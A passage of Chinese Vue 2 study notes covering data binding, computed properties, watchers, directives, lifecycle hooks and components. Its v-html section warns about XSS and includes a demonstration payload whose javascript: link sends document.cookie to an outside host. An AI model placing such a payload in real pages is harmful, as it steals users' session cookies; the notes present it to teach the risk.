阻止 vue 在启动时生成生产提示 // 创建Vue实例 const vm = new Vue(&#123; // el指定当前Vue实例为哪个容器服务。建立实例和容器的关系。 // 值通常为CSS选择器字符串，也可以写作： // el: document.getElementById(&#x27;root&#x27;), el: &#x27;#demo&#x27;, data: &#123; // data中用于存储数据，数据供el所指定的容器去使用 name: &#x27;Bob&#x27;, school: &#123; url: &#x27;http://www.baidu.com&#x27; &#125; &#125; &#125;) &lt;/script&gt;&lt;/body&gt; el的两种写法 new Vue时配置el属性 el: &#39;#root&#39;, 创建完Vue实例后再通过v.$mount(&#39;#root&#39;);指定el的值，mount有“挂载”之意 data的两种写法 对象式data: &#123;name:&#39;Bob&#39;&#125; 函数式 data() &#123; return&#123;name:&#39;Bob&#39;&#125; &#125;。在使用组件时必须使用函数式。 由Vue管理的函数一定 不要写箭头函数 ！ 否则this将不再是Vue实例。 初识Vue 想让Vue工作，就必须创建一个Vue实例（new Vue(&#123;&#125;))，且需要传入一个配置对象（el:&#39;#root&#39;,data:&#123;name:&#39;bob&#39;&#125;）。 root容器内的代码依然符合html规范，只不过会混入一些特殊语法（如双括号&#123;&#123; &#125;&#125;。容器的两个作用：1.作Vue模版。2.让Vue知道把工作成果放在何处。 root容器内的代码被称为Vue 模版 。 模版的解析流程为，先有容器，再有Vue实例，实例工作时读到行el:&#39;#root&#39;，就会把容器拿过来并进行解析，扫描有没有自己的特殊语法，如果有则作相应的替换。解析完后放回页面，替换掉刚才的整个容器。也就是模版经过解析后变成目标html片段。 data中的数据发生任何变化，Vue都会把模版重新解析一遍，模版里调用的方法也会重新调用一遍。 Vue实例和容器必须一一对应。 真实开发中只有一个Vue实例，并且会配合组件一起使用。 MVVM模型MVVM(Model-view-viewmode)，简称vm，是一种软件架构模式，M指模型（model），对应data中的数据；V指视图（View），即模版（页面）；VM指视图模型，对应Vue实例对象（new Vue(&#123;&#125;)）。下图中的两个箭头分别表示监听DOM和数据绑定，即把数据放到指定位置。在文档中经常使用vm这个变量名表示Vue实例。 data中所有的属性最后都会出现在vm身上。（数据代理） vm身上所有的属性，Vue原型身上所有的属性，在Vue模版中都可以直接使用。 数据代理 方法**Object.defineproperty()**：第一个参数-给哪个对象添加属性；第二个参数-要添加的属性叫什么名字；第三个属性-配置项 123456789101112131415161718192021let number = 18;let person = &#123; name:&#x27;bob&#x27;,&#125;Object.defineProperty(person, &#x27;age&#x27;, &#123; // value: 18, // enumerable: true, // 控制属性是否可以枚举，默认值是false // writeble: true, // 控制属性是否可以被修改，默认值是false // confugurable: true, // 控制属性是否可以被删除，默认值是false // 当读取person的age属性时，get函数(getter)就会被调用且返回值是age的值 get: function hihi() &#123; return number; &#125;, // 当修改person的age属性时，set函数(setter)就会被调用且会收到修改的值 set(value) &#123; number = value; &#125;&#125;)console.log(person); 数据代理：通过一个对象代理另一个对象中属性的操作（读&#x2F;写），好处是可以更加方便的操作data中的数据（否则就得&#123;&#123;_data.age&#125;&#125;。vm.data其实就是我们写的那个data。也可以在构造Vue实例前定义一个对象data，再将这个data给vm：const vm = new Vue(&#123;el: &#39;#demo&#39;,data&#125;)。此时vm._data &#x3D; options.data &#x3D; data，options就是new Vue时传入的配置对象。）。图中橙色和紫色的双箭头就是数据代理，每条线都既利用了get也利用了set。以name为例，它通过getter读取到data（.data）里的name，在修改vm里的name时通过setter也会将data（.data）里的name进行修改。.data里的内容是数据劫持的后果。数据代理的基本原理：通过Object.defineproperty()把data对象中所有属性添加到vm上，再为每个添加到vm上的属性都指定一个getter&#x2F;setter，在getter&#x2F;setter内部去操作（读&#x2F;写)data中对应的属性， template标签&lt;template&gt;&lt;/template&gt;最大的特点就是不影响结构，类似于小程序中的&lt;block&gt;&lt;/block&gt;。最终页面渲染的时候通过检查元素查看，可以看到并没有实际的&lt;template&gt;&lt;/template&gt;结构。 需要注意的是template只能配合v-if，不能配合v-show。 模版语法 插值语法：用于解析标签体内容（标签体内使用）写法为&#123;&#123;xxx&#125;&#125;。xxx为js表达式，可直接读到data中的所有属性。注意插值插的是函数返回值时，需要加括号：&#123;&#123;fullName()&#125;&#125;。 指令语法：用于解析标签（标签属性、标签体内容、绑定事件等）都是以v-开头，有v-bind、v-model、v-on等。 数据绑定：分为单向绑定和双向绑定单向绑定：v-bind:href=&quot;xxx&quot;，数据只能从data流向页面。它可以简写为:href=&quot;xxx&quot;。xxx也要是js表达式，且可以直接读取到js中的所有属性。双向绑定：v-model:value=&quot;name&quot;，数据能从页面和data间双向流动，一般都应用在表单类元素中。它可以简写为v-model=&quot;name&quot;，因为v-model默认收集的就是value值。 事件处理 使用v-on:xxx（简写为@xxx，xxx为事件名）绑定事件，如v-on:click=&quot;showInfo&quot; 配合new Vue(&#123;methods:&#123;showInfo() alert(&#39;hell0&#39;)&#125;&#125;)。 绑定事件的时候”@xxx&#x3D;”的后面可以加一些简单的语句，如@click=&quot;istrue = !istrue;x++&quot;。 事件的回调需要配置在methods对象中，最终会在vm上。 注意methods中配置的函数 不要用箭头函数！ 否则this就不是vm了。methods中配置的函数都是被Vue管理的函数，函数里this的指向是vm或组件实例对象。 @click&#x3D;”demo”和@click&#x3D;”demo($event)”效果一致，但后者可以传参。$event表示参数传入了event对象，如果使用前者但定义函数时传入了一个或多个参数，会自动给第一个参数复制为event其它为undefined。 事件修饰符 prevent：阻止默认事件（常用） stop：阻止事件冒泡（常用） once：事件只触发一次（常用） capture：使用事件的捕获模式 self：只有event.target是当前操作的元素时才触发事件 passive：事件的默认行为立即执行，无需等待事件回调执行完毕，移动端使用较多语法形如@click.prevent=&quot;showInfo&quot;。修饰符也可以连续写，@click.prevent.stop=&quot;showInfo&quot;意为先阻止默认行为再阻止冒泡。 键盘事件有@keyup和@keydown，前者更常用。在@keyup=&quot;showInfo&quot;中的函数showInfo里使用e.target.value或e.key可以获取按下的健名，使用e.keyCode可以获取按键的编码。通过语法@keyup.enter使用按键别名，事件在具有该别名的按键抬起时才会触发。 Vue提供的常用的按键别名：回车——enter，删除——delete（捕获“删除”和“退格”键），退出——esc，空格——space，换行——tab，上——up，下——down，左——left，右——right。 注意tab键本身有切换光标焦点的功能，使用 @keyup.tab达不到预期的效果，tab必须用keydown使用。 Vue未提供别名的按键可以使用按键原始的key值绑定（通过e.key获取），但注意要转为kebab-case（短横线命名，如e.key获取到的名字是CapsLock，需要写为caps-lock。） 系统修饰键（用法特殊）：ctrl、alt、shift、meta（win的徽标，mac的command） 配合keyup使用：按下修饰键的同时，再按下其他任意键随后释放该键，事件才被触发。 配合keydown使用：正常触发事件。 也适用于更强的要求，如按下ctrl+a才会触发事件：@keyup.ctrl.a。. （不推荐）可以使用keyCode去指定具体的按键，如@keydown.13。 通过Vue.config.keyCodes.自定义键名 = 键码，可以去定制按键别名 计算属性何为属性？Vue认为data里的东西就是属性，有属性名和属性值。计算属性就是要用的属性不存在，需要拿已有属性（Vue管理的属性才可以，不能是随便一个变量）去加工&#x2F;计算并生成一个全新的属性。底层原理是借助了Object.defineproperty方法提供的getter和setter。优势是与methods实现相比内部多了一个缓存机制（复用），效率更高且调试方便。计算属性最终会出现在vm上，直接调用即可；且如果计算属性需要被修改（vm.sum&#x3D;’张+三’ ），就必须写set函数响应修改，且set函数中需要引起计算时依赖的数据发生改变。计算属性不能放到data里，而需要放到另一个配置项computed里，并把计算过程放入一个 对象 ： 12345678910111213141516new Vue(&#123; el:&#x27;#root&#x27;, data:&#123;a:3,b:2&#125;, computed:&#123; sum:&#123; get()&#123; return this.a + &#x27;-&#x27; + this.b; &#125;， set(value)&#123; const arr = value.split(&#x27;-&#x27;); this.a = arr[0]; this.b = arr[1]; &#125; &#125; &#125;&#125;) 计算属性对象中get()函数的作用：当有人读取sum时就会被调用，且返回值作为sum的值。get()什么时候调用？1. 初次读取sum的值时。2.所依赖的数据（a或b）发生变化时。set()什么时候调用？sum的值被修改时。 当计算属性确定只有getter而没有setter时即只有读取需求，没修改需求时可以用简写属性。即不用写作配置对象，而是写作函数，此时函数就相当于getter： 123456// 简写属性computed:&#123; sum()&#123; return this.a + &#x27;-&#x27; + this.b; &#125;&#125; 需要注意的是计算属性靠的就是对应属性为名字的函数的返回值，但办不到让它等一等再有返回值。所以计算属性中不能开启异步任务去维护数据！ 而watch可以。 监视监视属性watch：当被监视的属性变化时，回调函数自动调用，进行相关操作。 监视的属性必须存在才能进行监视！ 监视的两种写法：(1) new Vue时传入watch配置 (2) 通过vm.$watch监视 1234567891011121314// 监视属性watch:&#123; // 这里的key名可以使用简写方式，不加引号。对象里的key是字符串。 // 但如果需要监视的属性是xxx.xxx，就需要加引号写作&#x27;xxx.xxx&#x27;的形式。 // 不加引号的前提是属性名必须满足变量取名的要求。 istrue:&#123; // handler:当istrue发生改变时调用 handler(newValue,oldValue)&#123; console.log(&#x27;istrue被修改了&#x27;,newValue,oldValue) &#125; // 初始化时调用一下handler immediate:true, &#125; &#125; 除了handler配置项，也可以用vm监视，首先要保证实例已经创建完毕。 12345678910vm.$watch(&#x27;istrue&#x27;,&#123; // 注意这里的key名需要加引号.对象里的key是字符串。 // 这个括号里的内容和上面写在watch里的内容一模一样 istrue:&#123; // handler:当istrue发生改变时调用 handler(newValue,oldValue)&#123; console.log(&#x27;istrue被修改了&#x27;,newValue,oldValue) &#125; // 初始化时调用一下handler immediate:true,&#125;) 至于这两种方式的选择，如果在创建实例时就已经明确需要监视谁，就使用watch属性；如果后续根据用户行为再决定需要监视谁，就调用第二种api方式。 深度监视如果data中有形如下面的‘numbers’数据，那么numbers就相当于是data中的一个key，它的value（a:1,b:1）就是这个key的地址。虽然Vue默认可以监视到data中多级数据内部值的改变，但它提供的watch默认不能。如果想让它可以，则需要利用deep:true属性。 1234567891011121314151617const vm = new Vue(&#123; el:&#x27;#root&#x27;, data:&#123; numbers:&#123; // 比如这个括号内的部分的地址是0x123，顺着0x123可以找到ab并改变它们的值。但只要0x123依然是它们的地址，numbers就会被认为是没有改变。 a:1, b:1 &#125; &#125;， watch:&#123; numbers:&#123; deep:true, handler()&#123; console.log(&#x27;numbers改变了&#x27;) &#125; &#125; &#125;&#125;) 监视属性的简写在配置项里没有deep、immediate等属性，只需要响应者handler时可以使用简写写法。 123456789101112131415watch:&#123; // 正常写法 /* numbers:&#123; istrue:&#123; handler(newValue,oldValue)&#123; console.log(&#x27;istrue被修改了&#x27;,newValue,oldValue) &#125; &#125; &#125;*/ // 简写写法,写成一个函数，参数照样传 istrue(newValue,oldValue)&#123; console.log(&#x27;istrue被修改了&#x27;,newValue,oldValue) &#125;&#125; 12345678910111213// 正常写法vm.$watch(&#x27;istrue&#x27;,&#123; istrue:&#123; handler(newValue,oldValue)&#123; console.log(&#x27;istrue被修改了&#x27;,newValue,oldValue) &#125; &#125;&#125;)// 简写写法：第二个函数不传配置项，而是函数。参数照样传。vm.$watch(&#x27;istrue&#x27;,function(newValue,oldValue)&#123; console.log(&#x27;istrue被修改了&#x27;,newValue,oldValue)&#125;) computed和watch的区别 computed能完成的功能watch都可以完成 watch能完成的功能computed不一定能完成，比如watch可以进行异步操作 两个重要的原则： 被Vue管理的函数最好写成普通函数，这样this的指向才是vm或组建实例对象 所有不被Vue管理的函数（定时器的回调函数、ajax的回调函数、promise的回调函数等 ），最好写成箭头函数，这样this的指向才是vm或组建实例对象 用监视属性实现异步任务计算属性中不能开启异步任务去维护数据，需要用监视属性。之所以要用箭头函数，是因为定时器虽然是在fullname中开启的，但定时器所指定的回调是不受vue控制的，而是受浏览器的定时器管理模块控制的，最后到点了也是浏览器引擎调用的定时器所指定的回调函数。如果用普通函数，因为定时器的回调函数是JS引擎调的，而且它调的时候this已经指定好了，就是window；如果用箭头函数，也是JS引擎调的这个函数，但由于写成了箭头函数，它就没有了自己的this，就要去往外找（箭头函数本身没有this指向，会向上查找）；往外找就找到了firstName的this。而firstName是Vue所管理的函数，又因为它是普通函数，所以它的this就是vm。 123456789101112watch:&#123; firstName(val)&#123; setTimeout(() =&gt; &#123; // 测试this // condole.log(this) this.fullname = val + &#x27;-&#x27; + this.lastName &#125;,1000); &#125;, lastName(val)&#123; this.fullname = val + &#x27;-&#x27; + this.lastName &#125;&#125; class与style绑定 class样式：写法为:class=&quot;xxx&quot;，xxx可以是字符串、对象、数组。 style样式：:style=&quot;&#123;fontSize:xxx&#125;&quot;，其中xxx是动态值；:style=&quot;[a,b]&quot;，其中a、b是样式对象。（样式对象的特点就是样式对象中的属性名都不能瞎写，得是存在的css属性。下面例子4、5中的对象就是样式对象。） 绑定class样式–字符串写法，适用于：样式的类名不确定，需要动态指定。比如下面的例子，已知必须要从mood里读东西，但读的是什么不确定。12345678910111213141516171819&lt;body&gt; &lt;div id = &quot;root&quot;&gt; &lt;div class=&quot;basic&quot; :class=&quot;mood&quot; @click=&quot;changeMood&quot;&gt;Hello&lt;/div&gt; &lt;/div&gt; &lt;script type=&quot;text/javascript&quot;&gt; new Vue(&#123; el:&#x27;#root&#x27;, data:&#123; mood:&#x27;normal&#x27; &#125;, methods:&#123; changeMood()&#123; this.mood = &#x27;happy&#x27; &#125; &#125; &#125;) &lt;/script&gt;&lt;/body&gt; 绑定class样式–数组写法，适用于：要绑定的样式个数不确定，名字也不确定。把一个数组传给v-bind:class，这样可以应用一个class列表：1&lt;div class=&quot;basic&quot; :class=&quot;classArr&quot;&gt;Hello&lt;/div&gt; 1data:&#123;classArr:[&#x27;myclass1&#x27;,&#x27;myclass2&#x27;,&#x27;myclass3&#x27;]&#125;, 绑定class样式–对象写法 ，适用于：要绑定的样式个数确定，名字也确定，但要动态决定用不用。1&lt;div class=&quot;basic&quot; :class=&quot;classObj&quot;&gt;Hello&lt;/div&gt; 123456data:&#123; classObj:&#123; myclass1:ture, myclass2:false &#125;&#125;, 也可以写为：1&lt;div class=&quot;basic&quot; :class=&quot;&#123;myclass1:a,myclass2:b&#125;&quot;&gt;Hello&lt;/div&gt; 1data:&#123;a:ture,b:false&#125;, 绑定style样式–对象写法1&lt;div class=&quot;basic&quot; :style=&quot;&#123;fontsize: fsize+&#x27;px&#x27;&#125;&quot;&gt;Hello&lt;/div&gt; 1data:&#123;fsize:40&#125;, 可以更直观地写为：1&lt;div class=&quot;basic&quot; :style=&quot;styleObj&quot;&gt;Hello&lt;/div&gt; 123data:&#123; styleObj:&#123; fontsize:&#x27;40px&#x27;,color:&#x27;red&#x27; &#125;&#125;, 绑定style样式–数组写法 1&lt;div class=&quot;basic&quot; :style=&quot;styleArr&quot;&gt;Hello&lt;/div&gt; 123456data:&#123; styleArr:[ &#123; fontsize:&#x27;40px&#x27;,color:&#x27;red&#x27;,&#125;, &#123; backgroundcolor:&#x27;orange&#x27;&#125; ] &#125; 这种写法不如：1&lt;div class=&quot;basic&quot; :style=&quot;[styleObj1,styleObj2]&quot;&gt;Hello&lt;/div&gt; 12345678data:&#123; styleObj1:&#123; fontsize:&#x27;40px&#x27;,color:&#x27;red&#x27;, &#125;, styleObj2:&#123; backgroundcolor:&#x27;orange&#x27; &#125;,&#125;, 条件渲染 v-if：适用于切换频率较低的场景。特点：不展示的DOM元素直接被移除。注意：v-if可以和v-else-if、v-else一起使用，但要求结构不能被“打断”。其含义类似于if if if和if else-if else。 v-if &#x3D; “表达式” v-else-if &#x3D; “表达式” v-else &#x3D; “表达式” v-show：适用于切换频率较高的场景。指令v-show=的等号后面是true或false，但也可以写一个表达式，根据表达式的值为真或假来给v-show赋值。也可以写v-show=&quot;a&quot;，这会让Vue去下面的data中找a，可以通过调整a实现动态的调整。特点：不展示的DOM元素未被移除，仅仅是使用样式隐藏掉。其底层实现是通过调整display:none。 使用v-if时元素可能无法获取到，而使用v-show一定可以获取到。 需要注意的是， template只能配合v-if，不能配合v-show。 列表渲染 v-for：加在谁身上就通过遍历的方式生成谁。（有一堆谁就给谁加v-for） 用于展示列表数据 语法：v-for=&quot;(item，index) in xxx&quot; :key=&quot;yyy&quot;（in可以用of代替）（注意key是唯一的） 可遍历数组(p,index)、对象(value,key)、字符串(char,index)（用的很少，value是每个单个字符）、指定次数(number,index)（非常少见 ，） 形参可以有不止一个，默认第一个是每一项内容（value），第二个是索引（index，如果遍历数组就是从0开始的数字；遍历对象就是每一个属性名；遍历字符串也是从0开始的数字）。使用多个形参最好用小括号括起来。 只要用了遍历（v-for）方式去生成多个同样结构的数据，就必须给每个结构作一个唯一标识，:key就是它们的标识。 123456789101112131415161718192021222324&lt;body&gt; &lt;div id=&quot;root&quot;&gt; &lt;ul&gt; &lt;!-- 下面的p是一个形参，这个形参可以直接在li标签体里面使用。 --&gt; &lt;!-- 传递多个形参： --&gt; &lt;!-- &lt;li v-for=&quot;(p,index) in persons&quot; :key=&quot;index&quot;&gt; --&gt; &lt;li v-for=&quot;p in persons&quot; :key=&quot;p.id&quot;&gt; &#123;&#123;p.name&#125;&#125;-&#123;&#123;p.age&#125;&#125; &lt;/li&gt; &lt;ul&gt; &lt;div&gt; &lt;script&gt; new Vue(&#123; el:&#x27;#root&#x27;, data:&#123; persons:[ // 每个人都应该有唯一的标识：id，一个人的各种信息应该封装在一个对象中 &#123;id:&#x27;001&#x27;,name:&#x27;张三&#x27;,age:18&#125;, &#123;id:&#x27;002&#x27;,name:&#x27;李四&#x27;,age:19&#125; ] &#125; &#125;) &lt;/script&gt;&lt;/body&gt; 列表过滤方法filter()创建一个新的数组，新数组中的元素是通过检查指定数组中符合条件的所有元素。其中的return是过滤条件，把符合条件的过滤出来。判断一个字符串中是否含有指定字符：使用属性indexOf。它可以判断字符出现的索引位置，没出现则返回-1。不会改变原数组，而是会把结果存储到新的数组中。1.用监视属性watch实现： 123456&lt;input type=&quot;text&quot; placeholder=&quot;请输入关键字&quot; v-model=&quot;keyWord&quot;&gt;&lt;ul&gt; &lt;li v-for=&quot;(p,index) in filPersons&quot; :key=&quot;index&quot;&gt; &#123;&#123;p.name&#125;&#125;-&#123;&#123;p.age&#125;&#125;-&#123;&#123;p.sex&#125;&#125; &lt;/li&gt;&lt;/ul&gt; 1234567891011121314151617data:&#123; keyWord:&#x27;&#x27;, persons:[ &#123;&#125;,&#123;&#125;,&#123;&#125;, ], filPersons:[], // 用来保管过滤出的数据而不对原数组进行修改&#125;,watch:&#123; keyWord:&#123; immediate:true, // 初始化时让handler调用一下；此时的val是空串，而任何字符串都包含空串，所以所有数据都符合过滤条件。 handler(val)&#123; this.filPersons = this.persons.filter((p)=&gt;&#123; return p.name.indexOf(val) !== -1 &#125;) &#125; &#125;&#125; 2.用计算属性computed实现： 123456789101112131415data:&#123; keyWord:&#x27;&#x27;, persons:[ &#123;&#125;,&#123;&#125;,&#123;&#125;, ], filPersons:[], // 用来保管过滤出的数据而不对原数组进行修改&#125;,computed:&#123; filPersons()&#123; // 只要keyWord变化，filPersons()就会重新执行 return this.persons.filter((p)=&gt;&#123; return p.name.indexOf(this.keyWord) !== -1 &#125; &#125;&#125;, 列表排序key的原理key的作用可以理解为就是给节点做一个标识，相当于人类社会中的身份证号。在原列表的最前面添加一个新的person项，用index作为key，为什么会出错？有问题的流程和id作为key的正确流程如下图所示：如果遍历时根本没有写key，Vue则会自动让index作为key。（面试题）react、vue中的key有什么作用？ 虚拟DOM中key的作用： key是虚拟DOM对象的标识，当数据发生变化时，Vue会根据【新数据】生成【新的虚拟DOM】，随后Vue进行【新虚拟DOM】与【旧虚拟DOM】的差异比较，比较规则如下： 对比规则： 旧虚拟DOM中找到了与新虚拟DOM 相同的key ：1. 若虚拟DOM中内容没变，直接使用之前的真实DOM！（之前的旧虚拟dom中肯定已经转过一次了）2. 若虚拟DOM中内容变了，则生成新的真实DOM，随后替换掉页面中之前的真实DOM。 旧虚拟DOM中未找到与新虚拟DOM相同的key：创建新的真实DOM随后渲染到页面。 用index作为key可能会引发的问题： 若对数据进行：逆序添加、逆序删除等破坏顺序操作：会产生没有必要的真实DOM更新 &#x3D;&#x3D;&gt; 界面效果没问题，但效率低。 如果结构中还包含输入类的DOM：会产生错误DOM更新 &#x3D;&#x3D;&gt; 页面有问题。 开发中如何选择key： 最好使用每条数据的唯一标识作为key，比如id、手机号、身份证号、学号等唯一值 如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，仅用于渲染列表用于展示，使用index作为key是没有问题的。 Vue监视数据 Vue会监视data中所有层次的数据。 如何监测对象中的数据？ 通过setter实现监视，且要在newVue时就传入要监测的数据。 对象中后追加的属性，Vue默认不做响应式处理 如需给后添加的属性做响应式，请使用如下API：Vue.set(target,propertyName&#x2F;index,value)或vm.$set(target,propertyName&#x2F;index,value) 如何监测数组中的数据？ 通过包裹数组更新元素的方法实现，本质是做了两件事： 调用原生对应的方法对数组进行更新 重新解析模版进而更新页面 在Vue修改数组中的某个元素一定要用如下方法： 使用这些API：push()、pop()、shift()、unshift()、splice()、sort()、reverse() Vue.set() 或 vm.$set() 特别注意：Vue.set() 和 vm.$set()不能给vm或vm的数据对象添加属性！！！ 收集表单数据 若&lt;input type=&quot;text&quot;/&gt;，则v-model收集的是value值，用户输入的就是value值。 若&lt;input type=&quot;radio&quot;/&gt;，则v-model收集的是value值，且要给标签配置value值。 若&lt;input type=&quot;checkbox&quot;/&gt; 没有配置input的value属性，那么收集的就是checked（勾选&#x2F;未勾选，是boolean） 配置input的value属性： （1）v-model的初始值是非数组，那么收集的就是checked（勾选&#x2F;未勾选，是boolean） （2）v-model的初始值是数组，那么收集的就是value组成的数组 v-model的三个修饰符：lazy：失去焦点再收集数据；number：输入字符串转为有效的数字；trim：输入首尾空格过滤通过 JSON.stringify() 把 JavaScript 对象转换为字符串。 过渡&amp;动画过滤器定义：对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑的处理）语法：1.注册过滤器：全局过滤器Vue.filter(name,callback) 或 局部过滤器new Vue&#123;filters:&#123;&#125;&#125;2.使用过滤器：&#123;&#123; xxx | 过滤器名&#125;&#125; 或 v-bind:属性 = ”xxx｜过滤器名“ 过滤器也可以接收额外参数，如 1&lt;h3&gt; 现在是：&#123;&#123;time | timeFormater(&#x27;YYYY_MM_DD&#x27;)&#125;&#125;&lt;/h3&gt; 123timeFormater(value,str=&#x27;YYYY年MM月DD日&#x27; HH：mm：ss&#x27;)&#123; return dayjs(value).format(str)&#125; 多个过滤器可以串联；而且过滤器并没有改变原本的数据，只是产生新的对应的数据。 内置指令与自定义指令内置指令（一）v-bind：单向绑定解析表达式，可简写为:xxxv-model：双向数据绑定v-for：遍历数组&#x2F;对象&#x2F;字符串v-on：绑定事件监听，可简写为@v-if：条件渲染（动态控制节点是否存在）v-else：条件渲染（动态控制节点是否存在）v-show：条件渲染（动态控制节点是否展示） （二）v-text：向其所在的节点中渲染文本内容。与插值语法&#123;&#123;xx&#125;&#125;的区别在于v-text会替换掉节点中的内容，&#123;&#123;xx&#125;&#125;则不会。 v-html：向指定节点中渲染包含html结构的内容。与插值语法&#123;&#123;xx&#125;&#125;的区别在于v-html会替换掉节点中 所有 的内容，&#123;&#123;xx&#125;&#125;则不会；且v-html可以识别html结构。**特别注意：v-html有安全性问题！1.在网站上动态渲染任意html都是非常危险的，容易导致xss攻击；2.一定要在可信的内容上使用v-html，永远不要在用户提交的内容上使用！**比如非法拿取cookie等操作。cookie简略图示如下：在浏览器中的Application&#x2F;储存空间&#x2F;存储中可以查看cookie，右键条目可以进行添加删除等操作。Chrome的插件”Cookie-Editor”可以让对cookie的操作更加方便。在html文件中，如果使用了v-html，进行下列操作就可以简单的拿到其他浏览器的cookie： 123&lt;div id=&quot;root&quot;&gt; &lt;div v-html=&quot;str&quot;&gt;&lt;/div&gt;&lt;/div&gt; 123456new Vue&#123; el:&#x27;#root&#x27;, data:&#123; str:&#x27;&lt;a href=javascript:location.href=&quot;http://www.baidu.com?&quot;+document.cookie&gt;快点击我！你的cookie要被拿走啦！&#x27; &#125;&#125; v-cloak（没有值）：本质上是一个特殊属性，Vue实例创建完毕并接管容器后会删掉v-cloak属性。使用css配合v-cloak可以解决网速慢时页面展示出的问题。 v-once（没有值）（只会执行一次）：v-once所在节点在初次被动态渲染后就视为静态内容了。以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能。 v-pre：跳过其所在节点的编译过程。可利用它跳过没有使用指令语法、没有使用插值语法的节点，会加快编译。 自定义指令 定义语法 1.局部指令： 1234567new Vue(&#123;directives:&#123;指令名：配置对象&#125;&#125;)// 或new Vue(&#123;directives:&#123;指令名：回调函数&#125;&#125;) 2.全局指令：Vue.directive&#123;指令名,配置对象&#125; 或 Vue.directive&#123;指令名,回调函数&#125; 配置对象中常用的3个回调： .bind：指令与元素成功绑定时调用。 .inserted：指令所在元素被插入页面时调用。（比如获取焦点就在此处） .update：指令所在模版结构被重新解析时调用。 注意： 指令定义时不加v-，但使用时要加v-； 指令名如果是多个单词，要使用kebab-case命名方式，不要使用camelCase命名。 如果不使用回调，指令会在两种时刻执行：1.指令与元素成功绑定时（一上来） 2.指令所在的模板被重新解析时。 插件用于增强Vue。本质是包含install方法的一个对象，install的第一个参数是Vue，第二个以后的参数是插件使用者传递的数据。 定义插件： 1234567891011121314对象.install = function(Vue,options)&#123; // 1. 添加全局过滤器 Vue.filter(....) // 2. 添加全局指令 Vue.directive(....) // 3. 配置全局混入（混合） Vue.mixin(....) // 4. 添加实例方法 Vue.prototype.$myMethod = function()&#123;...&#125; Vue.prototype.$myProperty = xxxx&#125; 使用插件：Vue.use() 自定义插件生命周期 在 http://www.atguigu.com/wp-content/uploads/2020/01/web20-1-2-2.png 查看生命周期图示。 是Vue在关键时刻帮我们调用的一些特殊名称的函数。生命周期函数的名字不可更改，但函数的具体内容是程序员根据需求编写的。生命周期函数中的this指向是vm 或 组建实例对象。生命周期函数写在与methods配置项同级的地方。 除了路由相关的那三个，一共有4对（8个）生命周期钩子。将要创建（数据监测、数据代理的创建）——beforeCreate()创建完毕——created()将要挂载——beforeMount()挂载完毕——mounted()将要更新——beforeUpdate()更新完毕——updated()将要销毁——beforeDestroy()销毁完毕——destroyed() 挂载流程上面的第一张图即为挂载流程。 更新流程 销毁流程关于销毁Vue实例：1.销毁后借助vue开发者工具看不到任何信息。2.销毁后 自定义 事件会失效，但 原生 DOM事件依然有效。3.一般不会在beforeDextroy操作数据，因为即使操作数据也不会再触发更新流程了。 常用的生命周期钩子 mounted：Vue完成模板的解析并把 初始的真实DOM元素 放入页面（挂载完毕）后调用。在vm的工作过程中mounted只会被调用一次。 用于发送ajax请求、启动定时器、绑定自定义事件、订阅消息等【初始化操作】。 beforeDestroy：当vm.$destroy()调用时调用此生命周期函数（虽然很少调，让张三自鲨不太好）。此时，vm中所有的data、methods、指令等都处于可用状态，马上要执行销毁过程。但 此时对数据的修改不会再触发更新。 用于清除定时器、解绑自定义事件、取消订阅消息等【收尾工作】。 Vue组件化模块：向外提供特定功能的js程序，一般就是一个js文件。由于js文件很多很复杂，模块化可以实现js的复用，简化js的编写，提高js运行效率。当应用中的js都是以模块来编写的，那么这个应用就是一个模块化的应用。 传统方式和组件化方式编写应用可以如下图所示，其中传统方式的左侧HTML文件是第二个需求所用到的： 组件：用来实现 局部 （特定）功能效果的 代码 和 资源 的 集合（html&#x2F;css&#x2F;js&#x2F;image等）。由于一个界面的功能很复杂，组件化可以实现编码的复用，简化项目编码，提高运行效率。当应用中的功能都是以多组件的方式来编写的，那么这个应用就是一个组件化的应用。 单文件组件指一个文件中只包含一个组件，文件和组件一一对应，一个文件就是一个组件(a.vue)；非单文件组件指一个文件中包含有n个组件(a.html)。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465&lt;body&gt; &lt;div id=&quot;root&quot;&gt; &lt;!-- 第三步：编写组件标签 --&gt; &lt;xuexiao&gt;&lt;/xuexiao&gt; &lt;hr&gt; &lt;!-- 第三步：编写组件标签 --&gt; &lt;xuesheng&gt;&lt;/xuesheng&gt; &lt;/div&gt; &lt;script&gt; // 第一步：创建school组件 const school = Vue.extend(&#123; name:&#x27;BUT&#x27;, // 如果在此处指定名字，就指定了组件在开发者工具中呈现的名字，注册时不能再更改。 template:` &lt;div&gt; &lt;h2&gt;学校名称:&#123;&#123;schoolName&#125;&#125;&lt;/h2&gt; &lt;h2&gt;学校地址:&#123;&#123;address&#125;&#125;&lt;/h2&gt; &lt;button @click=&quot;showName&quot;&gt;显示学校名&lt;/button&gt; &lt;/div&gt; `, data()&#123; return&#123; schoolName:&#x27;BUT&#x27;, address:&#x27;beijing&#x27; &#125; &#125;, methods:&#123; showName()&#123; alert(this.schoolName) &#125; &#125;, &#125;) // 第一步：创建student组件 const student = Vue.extend(&#123; template:` &lt;div&gt; &lt;h2&gt;学生姓名:&#123;&#123;studentName&#125;&#125;&lt;/h2&gt; &lt;h2&gt;学生年龄:&#123;&#123;age&#125;&#125;&lt;/h2&gt; &lt;/div&gt; `, data()&#123; return&#123; studentName:&#x27;BUT&#x27;, age:&#x27;beijing&#x27; &#125; &#125; &#125;) // 创建vm new Vue(&#123; el:&#x27;#root&#x27;, // 第二步：注册组件 components:&#123; // 局部注册xuexiao和xuesheng;只有#root可以用 xuexiao:school, xuesheng:student &#125; &#125;) new Vue(&#123; el:&#x27;#root2&#x27;, &#125;) // 全局注册组件；#root和#root2都可以用。 Vue.component(&#x27;xuexiao&#x27;,school) &lt;/script&gt;&lt;/body&gt; 使用组件的基本步骤Vue中使用组件的三大步骤：一、定义组件（创建组件）二、注册组件三、使用组件（写组件标签&lt;xuexiao&gt;&lt;/xuexiao&gt;） 如何定义一个组件？ 使用Vue.extend(options)创建，其中options和new Vue(options)时传入的那个options几乎一样，但也有点区别： el不要写。因为最终所有的组件都要经过一个vm的管理，由vm中的el决定服务哪个容器。 el只能用在通过new关键字创建的Vue实例上，也就是只有new 